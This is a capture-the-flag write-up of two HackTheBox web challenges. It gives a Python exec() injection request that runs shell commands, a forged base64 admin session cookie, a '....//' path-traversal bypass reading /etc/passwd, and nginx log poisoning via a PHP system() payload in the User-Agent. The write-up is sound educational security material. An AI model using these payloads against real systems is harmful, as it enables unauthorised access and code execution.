# HackTheBox Ambassadors CTF Writeup

## Web Challenges

### Interdimensional Calculator

This was a pretty easy challenge in terms of difficulty and is very beginner oriented.

Initially we arrive at a homepage seemingly containing nothing. But on inspecting the HTML of the page we can find the /debug endpoint.

The /debug endpoint simply contains the source code of the webserver.

Source Code:
```python
from flask import Flask, Response, request, render_template, request
from random import choice, randint
from string import lowercase
from functools import wraps

app = Flask(__name__)

def calc(recipe):
	global garage
	garage = {}
	try: exec(recipe, garage)
	except: pass

def GCR(func): # Great Calculator of the observable universe and it's infinite timelines
	@wraps(func)
	def federation(*args, **kwargs):
		ingredient = ''.join(choice(lowercase) for _ in range(10))
		recipe = '%s = %s' % (ingredient, ''.join(map(str, [randint(1, 69), choice(['+', '-', '*']), randint(1,69)])))

		if request.method == 'POST':
			ingredient = request.form.get('ingredient', '')
			recipe = '%s = %s' % (ingredient, request.form.get('measurements', ''))

		calc(recipe)

		if garage.get(ingredient, ''):
			return render_template('index.html', calculations=garage[ingredient])

		return func(*args, **kwargs)
	return federation

@app.route('/', methods=['GET', 'POST'])
@GCR
def index():
	return render_template('index.html')

@app.route('/debug')
def debug():
	return Response(open(__file__).read(), mimetype='text/plain')

if __name__ == '__main__':
	app.run('0.0.0.0', port=1337)
```

Here we can see the exec() function used to evaluate the result. We can use this to exploit command injection and get the flag.

So the final request we can send will be like this:
```
POST / HTTP/1.1
Host: host:port
Accept-Language: en-GB,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 71

ingredient=dummy&measurements=__import__('os').popen('cat+flag').read()
```

This yields the flag.

### Broken Production

We are greeted by a login page so let's log in. 

Now there is seemingly no lead on the homepage or its source code. So let's check the cookies. Also we are provided with the source code so that obviously helps.

This is the source code to SessionHandler.php
```php
<?php
class SessionHandler
{
    public function __construct()
    {
        if (!empty($_COOKIE['PHPSESSID'])){
            $this->cookie = $_COOKIE['PHPSESSID'];
            $this->load();
        }
    }

    public function login($username)
    {
        setcookie('PHPSESSID', base64_encode(json_encode([
            'username' => $username
        ])), time()+1333337, '/');
    }

    public function load()
    {
        $this->data = json_decode(base64_decode($this->cookie));
    }

    public function isLoggedIn()
    {
        return !is_null($this->data->username);
    }

    public function isAdmin()
    {
        return $this->data->username === 'admin';
    }

    public function getUsername()
    {
        return $this->data->username;
    }

    public function distroy()
    {
        unset($_COOKIE['PHPSESSID']);
        setcookie('PHPSESSID', '', time() - 3600, '/');
    }
}
```

As you can see, the cookie generation mechanism is very weak as it simply base64 encodes this payload `{"username":<your_username>"}` into the session id. So we can easily spoof the admin cookie here by base64 encoding this: `{"username":"admin"}`.

That gives us this: `eyJ1c2VybmFtZSI6ImFkbWluIn0`

Replace this cookie in your browser and you can reach the admin panel. Here we can use 3 utilities:
1. logs.php
2. tickets.php
3. todo.php

All of this is controlled by the util parameter in the homepage like this:
```
http://host:port/?util=logs.php
```

Now just by seeing this I was pretty sure our method of gaining RCE was via log poisoning. But how?

This util parameter has some protections so let's see what they are from the source code.

This is what I found in views/admin.php

```php
if (isset($_GET['util']))
        $utilFile = $_GET['util'];
        $utilFile = str_replace("../","", $utilFile);

```

There we have it, a classic case of non-recursive replacing of strings. All it does is to check for any instance of `../` in a string and replace it with empty string. So to get the `../` of our desires all we do is send `....//` in its place. This ends up replacing the `../`, leaving behind another `../` that stays in the payload. So all we really need to do to bypass this is to send this payload:
`http://host:port/?util=....//....//....//....//....//....//etc/passwd`. 

This allows us to exploit an LFI.

Now this puts the pieces together for us to gain RCE. So we know that the log file is located at `/var/log/nginx/access.log`. So we'll use make a request to the server by changing the `User-Agent` header to some PHP code and then use the LFI to get it to actually execute. So the final exploitation steps look something like this:
1. Send this command `curl -A "<?php system('cat /flag*'); ?>" http://host:port/`
2. Then visit this page: `http://host:port/?util=....//....//....//....//....//....//var/log/nginx/access.log`. 

You should see your flag there :).

